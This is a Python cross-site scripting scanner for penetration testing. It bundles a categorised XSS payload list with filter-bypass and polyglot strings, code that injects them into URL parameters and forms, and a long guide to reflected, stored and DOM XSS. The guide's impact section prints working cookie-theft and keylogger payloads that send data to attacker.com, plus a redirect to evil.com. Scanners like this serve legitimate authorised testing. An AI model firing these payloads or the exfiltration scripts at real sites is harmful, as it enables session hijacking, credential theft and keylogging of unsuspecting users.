#!/usr/bin/env python3
"""
XSS Scanner - Cross-Site Scripting Vulnerability Tester
For authorized security testing only

QUICK START:
    ./xss_scanner.py -u "http://target.com/search?q=test"    # Test single URL
    ./xss_scanner.py -u "http://target.com/form" --forms     # Test forms
    ./xss_scanner.py -l urls.txt                             # Test URL list
"""

import argparse
import sys
import os
import re
import urllib.parse
import html
from typing import List, Dict, Tuple, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("Error: requests library required. Install with: pip install requests")
    sys.exit(1)

# Colors
class C:
    R = '\033[91m'
    Y = '\033[93m'
    G = '\033[92m'
    B = '\033[94m'
    M = '\033[95m'
    C = '\033[96m'
    W = '\033[97m'
    E = '\033[0m'
    BOLD = '\033[1m'

# XSS Payloads by category
XSS_PAYLOADS = {
    'basic': [
        '<script>alert(1)</script>',
        '<script>alert("XSS")</script>',
        '"><script>alert(1)</script>',
        "'><script>alert(1)</script>",
        '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>',
        '<body onload=alert(1)>',
    ],
    'event_handlers': [
        '" onmouseover="alert(1)"',
        "' onmouseover='alert(1)'",
        '" onfocus="alert(1)" autofocus="',
        "' onfocus='alert(1)' autofocus='",
        '<input onfocus=alert(1) autofocus>',
        '<marquee onstart=alert(1)>',
        '<video><source onerror="alert(1)">',
        '<audio src=x onerror=alert(1)>',
    ],
    'encoded': [
        '%3Cscript%3Ealert(1)%3C/script%3E',
        '&lt;script&gt;alert(1)&lt;/script&gt;',
        '&#60;script&#62;alert(1)&#60;/script&#62;',
        '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
        '\\u003cscript\\u003ealert(1)\\u003c/script\\u003e',
    ],
    'filter_bypass': [
        '<scr<script>ipt>alert(1)</scr</script>ipt>',
        '<SCRIPT>alert(1)</SCRIPT>',
        '<ScRiPt>alert(1)</sCrIpT>',
        '<script/src="data:,alert(1)">',
        '<svg/onload=alert(1)>',
        '<img src="x" onerror="alert(1)">',
        '<img src=`x` onerror=`alert(1)`>',
        '"><img src=x onerror=alert(1)>//',
        '<iframe src="javascript:alert(1)">',
        '<object data="javascript:alert(1)">',
    ],
    'dom_based': [
        'javascript:alert(1)',
        'data:text/html,<script>alert(1)</script>',
        '#<script>alert(1)</script>',
        '"><script>alert(document.domain)</script>',
    ],
    'polyglot': [
        'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e',
        '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|\\><plaintext/onmouseover=prompt(1)>',
    ]
}

# Detection patterns
XSS_DETECT_PATTERNS = [
    r'<script[^>]*>.*?alert\s*\(',
    r'onerror\s*=\s*["\']?alert',
    r'onload\s*=\s*["\']?alert',
    r'onmouseover\s*=\s*["\']?alert',
    r'onfocus\s*=\s*["\']?alert',
    r'<img[^>]+onerror',
    r'<svg[^>]+onload',
    r'javascript\s*:\s*alert',
]

HELP_TEXT = """
================================================================================
                       XSS SCANNER - COMPLETE GUIDE
================================================================================

WHAT IS XSS AND WHY SHOULD YOU CARE?
------------------------------------
Cross-Site Scripting (XSS) lets an attacker inject JavaScript into web pages
that other users view. When the victim's browser loads the page, it runs the
attacker's code as if it came from the trusted website.

REAL-WORLD IMPACT:
  • Session hijacking - steal login cookies, take over accounts
  • Credential theft - fake login forms that send passwords to attacker
  • Malware distribution - redirect users to malicious sites
  • Defacement - change what the page displays
  • Keylogging - capture everything the user types
  • Webcam/mic access - via social engineering prompts

XSS is in OWASP Top 10 and affects huge sites - even Google, Facebook, and
Twitter have had XSS vulnerabilities. It's extremely common.

THE THREE TYPES OF XSS (AND WHY IT MATTERS)
-------------------------------------------

REFLECTED XSS (Non-Persistent)
  HOW IT WORKS: Your payload is in the URL. When victim clicks the link,
                the server "reflects" your input back in the page.

  EXAMPLE:
    Vulnerable URL: http://shop.com/search?q=shoes
    Attack URL:     http://shop.com/search?q=<script>alert(document.cookie)</script>

    The search page shows "Results for: <script>alert(document.cookie)</script>"
    but the browser executes the script instead of displaying it!

  ATTACK SCENARIO:
    1. Attacker finds XSS in search parameter
    2. Crafts malicious URL with cookie-stealing payload
    3. Sends link to victim (phishing email, social media, etc.)
    4. Victim clicks, their cookies sent to attacker's server
    5. Attacker uses cookies to hijack victim's session

  DETECTION: This scanner finds reflected XSS by injecting payloads and
             checking if they appear unfiltered in the response.

STORED XSS (Persistent) - MOST DANGEROUS
  HOW IT WORKS: Your payload gets SAVED in the database. Every user who
                views that data gets hit - no special link needed.

  EXAMPLE:
    Comment form on blog allows: <script>steal_cookies()</script>
    Every visitor to that blog post now runs the attacker's script!

  ATTACK SCENARIO:
    1. Attacker posts malicious comment on popular forum
    2. Payload saved to database
    3. Every user viewing that thread gets infected
    4. Mass cookie theft without any user interaction

  DETECTION: Harder to detect automatically. Post payloads to forms, then
             check if they execute when viewing the content.

DOM-BASED XSS (Client-Side)
  HOW IT WORKS: The vulnerability is in client-side JavaScript, not the
                server. The page's own JS reads your input unsafely.

  EXAMPLE:
    Page has: document.write("Welcome " + location.hash.substring(1))
    Attack:   http://site.com/page#<script>alert(1)</script>

    The server never sees the payload (it's after the #), but the
    browser's JavaScript processes it unsafely.

  DETECTION: Requires analyzing JavaScript source, not just server responses.
             Look for dangerous sinks: innerHTML, document.write, eval, etc.

HOW THE SCANNER TESTS FOR XSS
-----------------------------
1. Finds parameters in the URL (like ?search=test&page=1)
2. Injects XSS payloads into each parameter
3. Checks if the payload appears in the response
4. Analyzes if it appears in an executable context

UNDERSTANDING THE RESULTS
-------------------------

[VULNERABLE] - HIGH CONFIDENCE
  WHAT IT MEANS: The payload was reflected AND appears to be in an
                 executable context (inside <script>, event handler, etc.)

  WHAT TO DO:
  → Open the URL in a browser to confirm the alert fires
  → Document the exact payload and parameter
  → Try variations to understand what's filtered
  → Test impact: can you steal cookies? redirect users?

[REFLECTED] - NEEDS MANUAL VERIFICATION
  WHAT IT MEANS: The payload appears in the response, but might be
                 escaped or in a non-executable context.

  WHAT TO DO:
  → View the page source - where exactly is the payload?
  → Is it inside HTML tags, attributes, JavaScript, or plain text?
  → Try context-specific payloads (see below)
  → It might still be exploitable with the right payload

[FILTERED] - PAYLOAD BLOCKED
  WHAT IT MEANS: The payload was removed or encoded by the application.

  WHAT TO DO:
  → Try encoding the payload (URL encode, HTML entities)
  → Try filter bypass techniques (case variation, nested tags)
  → Use --level 3 for more bypass payloads
  → Some filters are incomplete - keep trying variations

CONTEXT MATTERS - WHERE DOES YOUR INPUT LAND?
---------------------------------------------
The right payload depends on WHERE your input appears in the page:

INSIDE HTML (between tags):
  Your input: test
  Page shows: <div>test</div>
  Payload:    <script>alert(1)</script>
  Result:     <div><script>alert(1)</script></div> ← EXECUTES!

INSIDE AN HTML ATTRIBUTE:
  Your input: test
  Page shows: <input value="test">
  Payload:    " onmouseover="alert(1)
  Result:     <input value="" onmouseover="alert(1)"> ← EXECUTES on hover!

INSIDE JAVASCRIPT:
  Your input: test
  Page shows: <script>var x = "test";</script>
  Payload:    ";alert(1);//
  Result:     <script>var x = "";alert(1);//";</script> ← EXECUTES!

INSIDE A URL/HREF:
  Your input: test
  Page shows: <a href="test">link</a>
  Payload:    javascript:alert(1)
  Result:     <a href="javascript:alert(1)">link</a> ← EXECUTES on click!

WHEN TO USE EACH SCAN LEVEL
---------------------------

LEVEL 1 (--level 1) - Quick Scan
  PAYLOADS: Basic <script>alert()</script> and simple event handlers
  USE WHEN: Quick check, time-limited, or testing many URLs
  FINDS:    Obvious XSS with no filtering

LEVEL 2 (--level 2) - Standard Scan (Default)
  PAYLOADS: Basic + encoded payloads + more event handlers
  USE WHEN: Normal testing, good balance of speed and coverage
  FINDS:    Most common XSS vulnerabilities

LEVEL 3 (--level 3) - Thorough Scan
  PAYLOADS: All of above + filter bypasses + polyglots + DOM payloads
  USE WHEN: Deep testing, security audit, or when you suspect XSS
  FINDS:    Obscure XSS, filtered contexts, complex scenarios

SCENARIO-BASED USAGE
--------------------

SCENARIO: "Quick check of a search page"
COMMAND:  ./xss_scanner.py -u "http://target.com/search?q=test"
WHY:      Tests the 'q' parameter with standard payloads.
NEXT:     If [REFLECTED], try manual payloads in browser.

SCENARIO: "Test all forms on a page"
COMMAND:  ./xss_scanner.py -u "http://target.com/contact" --forms
WHY:      Finds <form> elements and tests each input field.
          Contact forms, comment boxes, and login forms are common targets.
NEXT:     Check for stored XSS - submit payload, then view it elsewhere.

SCENARIO: "Testing authenticated areas"
COMMAND:  ./xss_scanner.py -u "http://target.com/profile?tab=info" --cookie "session=abc123"
WHY:      Many XSS vulnerabilities are in authenticated areas.
          The --cookie option maintains your logged-in session.
NEXT:     Test profile fields, settings, messages - anywhere users input data.

SCENARIO: "I know there's XSS but can't trigger it"
COMMAND:  ./xss_scanner.py -u "http://target.com/page?x=test" --level 3
WHY:      Level 3 includes filter bypass payloads like:
          - Case variations: <ScRiPt>
          - Nested tags: <scr<script>ipt>
          - Encoded: %3Cscript%3E
          - Polyglots that work in multiple contexts
NEXT:     View source, understand the filter, craft custom bypass.

SCENARIO: "Mass testing from Burp/crawl results"
COMMAND:  ./xss_scanner.py -l urls.txt --level 1 --threads 20
WHY:      Fast scan of many URLs to find low-hanging fruit.
          Level 1 is fast, threads speed up processing.
NEXT:     Investigate any hits with deeper manual testing.

WHAT TO DO AFTER FINDING XSS
----------------------------

1. CONFIRM IT'S REAL
   Open the vulnerable URL in a browser. Does alert(1) actually fire?
   Some "vulnerable" results are false positives in non-executable contexts.

2. ASSESS THE IMPACT
   Can you:
   - Steal cookies? (check if HttpOnly flag is missing)
   - Access sensitive data on the page?
   - Perform actions as the user?
   - Redirect to phishing pages?

3. DEMONSTRATE IMPACT (for reports)
   Instead of alert(1), show real impact:
   - Cookie theft: <script>new Image().src="http://attacker.com/steal?c="+document.cookie</script>
   - Redirect: <script>location="http://evil.com"</script>
   - Keylogger: <script>document.onkeypress=function(e){new Image().src="http://attacker.com/log?k="+e.key}</script>

4. CHECK FOR STORED XSS
   If you can submit content (comments, profiles, messages):
   - Submit payload
   - Check if it persists and executes for other users
   - Stored XSS is much more severe than reflected

BYPASSING COMMON FILTERS
------------------------

IF <script> IS BLOCKED:
  Try: <img src=x onerror=alert(1)>
  Try: <svg onload=alert(1)>
  Try: <body onload=alert(1)>

IF alert IS BLOCKED:
  Try: confirm(1) or prompt(1)
  Try: alert`1` (template literal)
  Try: window['al'+'ert'](1)

IF QUOTES ARE BLOCKED:
  Try: <img src=x onerror=alert(1)>  (no quotes needed)
  Try: <img src=x onerror=alert(String.fromCharCode(88,83,83))>

IF PARENTHESES ARE BLOCKED:
  Try: <img src=x onerror=alert`1`>
  Try: <svg/onload=alert`1`>

IF SPACES ARE BLOCKED:
  Try: <svg/onload=alert(1)>  (/ instead of space)
  Try: <svg%0aonload=alert(1)>  (newline)

COMMON MISTAKES TO AVOID
------------------------
❌ Only testing URL parameters - forms are often more vulnerable
❌ Assuming alert() must fire - check page source for reflection
❌ Ignoring [REFLECTED] results - they often lead to real XSS
❌ Not testing authenticated areas - that's where the good bugs are
❌ Using only <script> tags - event handlers bypass many filters
❌ Not considering context - the same payload won't work everywhere

QUICK REFERENCE
---------------
./xss_scanner.py -u "URL?param=test"              # Basic test
./xss_scanner.py -u "URL" --forms                 # Test forms
./xss_scanner.py -u "URL" --level 3               # Thorough scan
./xss_scanner.py -u "URL" --cookie "sess=x"       # Authenticated
./xss_scanner.py -l urls.txt                      # Batch test
./xss_scanner.py -u "URL" --proxy http://127.0.0.1:8080  # Via Burp

================================================================================
"""

def banner():
    print(f"""{C.C}
 _  _  ___  ___   ___
( \\/ )/ __)/ __) / __)  ___  __ _  _ _   _ _   ___ _ _
 )  ( \\__ \\\\__ \\ \\__ \\ / __// _` || ' \\ | ' \\ / -_) '_|
(_/\\_)(___/(___/ (___/ \\___\\\\__,_||_||_||_||_|\\___|_|
{C.E}{C.Y}Cross-Site Scripting Scanner{C.E}
""")

def get_payloads(level: int = 2) -> List[str]:
    """Get payloads based on testing level"""
    payloads = []

    if level >= 1:
        payloads.extend(XSS_PAYLOADS['basic'])
    if level >= 2:
        payloads.extend(XSS_PAYLOADS['event_handlers'])
        payloads.extend(XSS_PAYLOADS['encoded'])
    if level >= 3:
        payloads.extend(XSS_PAYLOADS['filter_bypass'])
        payloads.extend(XSS_PAYLOADS['dom_based'])
        payloads.extend(XSS_PAYLOADS['polyglot'])

    return payloads

def parse_url_params(url: str) -> Dict[str, str]:
    """Extract URL parameters"""
    parsed = urllib.parse.urlparse(url)
    return dict(urllib.parse.parse_qsl(parsed.query))

def build_url(base_url: str, params: Dict[str, str]) -> str:
    """Rebuild URL with parameters"""
    parsed = urllib.parse.urlparse(base_url)
    query = urllib.parse.urlencode(params)
    return urllib.parse.urlunparse((
        parsed.scheme, parsed.netloc, parsed.path,
        parsed.params, query, parsed.fragment
    ))

def check_xss_reflection(response_text: str, payload: str) -> Tuple[bool, str]:
    """Check if XSS payload is reflected and potentially executable"""

    # Check for exact reflection
    if payload in response_text:
        # Check if it looks executable
        for pattern in XSS_DETECT_PATTERNS:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True, 'vulnerable'
        return True, 'reflected'

    # Check for decoded reflection
    decoded = html.unescape(payload)
    if decoded in response_text:
        return True, 'reflected_decoded'

    # Check for URL-decoded reflection
    url_decoded = urllib.parse.unquote(payload)
    if url_decoded in response_text:
        return True, 'reflected_urldecoded'

    return False, 'filtered'

def test_parameter(url: str, param: str, payload: str,
                   session: requests.Session, timeout: int = 10) -> Optional[Dict]:
    """Test a single parameter with a payload"""
    try:
        params = parse_url_params(url)
        original_value = params.get(param, '')
        params[param] = payload

        test_url = build_url(url, params)
        response = session.get(test_url, timeout=timeout, verify=False)

        reflected, status = check_xss_reflection(response.text, payload)

        if reflected:
            return {
                'url': url,
                'parameter': param,
                'payload': payload,
                'status': status,
                'response_code': response.status_code
            }
    except Exception as e:
        pass

    return None

def find_forms(url: str, session: requests.Session) -> List[Dict]:
    """Find HTML forms on a page"""
    forms = []

    try:
        response = session.get(url, timeout=10, verify=False)

        # Simple regex-based form extraction
        form_pattern = r'<form[^>]*action=["\']?([^"\'\s>]*)["\']?[^>]*>(.*?)</form>'
        input_pattern = r'<input[^>]*name=["\']?([^"\'\s>]*)["\']?[^>]*>'

        for form_match in re.finditer(form_pattern, response.text, re.IGNORECASE | re.DOTALL):
            action = form_match.group(1) or url
            form_html = form_match.group(2)

            # Get method
            method = 'GET'
            if 'method=' in form_match.group(0).lower():
                if 'post' in form_match.group(0).lower():
                    method = 'POST'

            # Find inputs
            inputs = re.findall(input_pattern, form_html, re.IGNORECASE)

            if inputs:
                # Build absolute URL for action
                if not action.startswith('http'):
                    parsed = urllib.parse.urlparse(url)
                    if action.startswith('/'):
                        action = f"{parsed.scheme}://{parsed.netloc}{action}"
                    else:
                        action = f"{parsed.scheme}://{parsed.netloc}/{action}"

                forms.append({
                    'action': action,
                    'method': method,
                    'inputs': inputs
                })
    except Exception as e:
        pass

    return forms

def test_form(form: Dict, payload: str, session: requests.Session) -> List[Dict]:
    """Test a form with XSS payload"""
    results = []

    for input_name in form['inputs']:
        try:
            data = {inp: 'test' for inp in form['inputs']}
            data[input_name] = payload

            if form['method'] == 'POST':
                response = session.post(form['action'], data=data, timeout=10, verify=False)
            else:
                response = session.get(form['action'], params=data, timeout=10, verify=False)

            reflected, status = check_xss_reflection(response.text, payload)

            if reflected:
                results.append({
                    'url': form['action'],
                    'parameter': input_name,
                    'payload': payload,
                    'status': status,
                    'method': form['method'],
                    'response_code': response.status_code
                })
        except:
            pass

    return results

def scan_url(url: str, session: requests.Session, level: int = 2,
             test_forms: bool = False, threads: int = 10) -> List[Dict]:
    """Scan a URL for XSS vulnerabilities"""
    results = []
    payloads = get_payloads(level)

    # Get parameters from URL
    params = parse_url_params(url)

    if not params and not test_forms:
        print(f"{C.Y}[!]{C.E} No parameters found in URL")
        return results

    # Test URL parameters
    if params:
        print(f"{C.B}[*]{C.E} Testing {len(params)} URL parameters with {len(payloads)} payloads...")

        tasks = []
        for param in params:
            for payload in payloads:
                tasks.append((url, param, payload))

        with ThreadPoolExecutor(max_workers=threads) as executor:
            futures = {
                executor.submit(test_parameter, t[0], t[1], t[2], session): t
                for t in tasks
            }

            for future in as_completed(futures):
                result = future.result()
                if result:
                    results.append(result)
                    status_color = C.R if result['status'] == 'vulnerable' else C.Y
                    print(f"{status_color}[{result['status'].upper()}]{C.E} "
                          f"param={C.Y}{result['parameter']}{C.E} "
                          f"payload={C.C}{result['payload'][:40]}...{C.E}")

    # Test forms
    if test_forms:
        print(f"\n{C.B}[*]{C.E} Scanning for forms...")
        forms = find_forms(url, session)

        if forms:
            print(f"{C.B}[*]{C.E} Found {len(forms)} forms")

            for form in forms:
                print(f"{C.B}[*]{C.E} Testing form: {form['action']} ({form['method']})")

                for payload in payloads[:10]:  # Limit payloads for forms
                    form_results = test_form(form, payload, session)
                    for result in form_results:
                        results.append(result)
                        status_color = C.R if result['status'] == 'vulnerable' else C.Y
                        print(f"{status_color}[{result['status'].upper()}]{C.E} "
                              f"form param={C.Y}{result['parameter']}{C.E}")

    return results

def main():
    parser = argparse.ArgumentParser(
        description='XSS Scanner - Cross-Site Scripting Vulnerability Tester',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='For authorized security testing only.'
    )

    parser.add_argument('-u', '--url', help='Single URL to test')
    parser.add_argument('-l', '--list', help='File containing URLs to test')
    parser.add_argument('--forms', action='store_true', help='Also test HTML forms')
    parser.add_argument('--level', type=int, choices=[1, 2, 3], default=2,
                       help='Testing level (1=quick, 3=thorough)')
    parser.add_argument('--cookie', help='Cookie header for authenticated testing')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads')
    parser.add_argument('-o', '--output', help='Save results to file')
    parser.add_argument('--proxy', help='Proxy URL (e.g., http://127.0.0.1:8080)')
    parser.add_argument('--timeout', type=int, default=10, help='Request timeout')
    parser.add_argument('--help-full', action='store_true', help='Show detailed help')

    args = parser.parse_args()

    if args.help_full:
        print(HELP_TEXT)
        return

    if not args.url and not args.list:
        banner()
        parser.print_help()
        print(f"\n{C.Y}Tip:{C.E} Use --help-full for detailed usage guide")
        return

    banner()

    # Setup session
    session = requests.Session()
    session.headers['User-Agent'] = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'

    if args.cookie:
        session.headers['Cookie'] = args.cookie

    if args.proxy:
        session.proxies = {'http': args.proxy, 'https': args.proxy}

    all_results = []

    # Get URLs to test
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        try:
            with open(args.list, 'r') as f:
                urls.extend([line.strip() for line in f if line.strip()])
        except Exception as e:
            print(f"{C.R}[!]{C.E} Error reading URL list: {e}")
            return

    # Scan each URL
    for url in urls:
        print(f"\n{C.B}[*]{C.E} Testing: {C.Y}{url}{C.E}")
        print(f"{C.B}[*]{C.E} " + "=" * 50)

        results = scan_url(
            url, session,
            level=args.level,
            test_forms=args.forms,
            threads=args.threads
        )
        all_results.extend(results)

    # Summary
    print(f"\n{C.M}[Summary]{C.E}")
    vulnerable_count = sum(1 for r in all_results if r['status'] == 'vulnerable')
    reflected_count = sum(1 for r in all_results if 'reflected' in r['status'])

    print(f"{C.R}[!]{C.E} Potentially Vulnerable: {C.R}{vulnerable_count}{C.E}")
    print(f"{C.Y}[!]{C.E} Reflected (may need manual verify): {C.Y}{reflected_count}{C.E}")

    # Save output
    if args.output and all_results:
        with open(args.output, 'w') as f:
            f.write("XSS Scanner Results\n")
            f.write("=" * 50 + "\n\n")

            for r in all_results:
                f.write(f"URL: {r['url']}\n")
                f.write(f"Parameter: {r['parameter']}\n")
                f.write(f"Status: {r['status']}\n")
                f.write(f"Payload: {r['payload']}\n")
                f.write("-" * 30 + "\n")

        print(f"\n{C.B}[*]{C.E} Results saved to {args.output}")

if __name__ == '__main__':
    main()
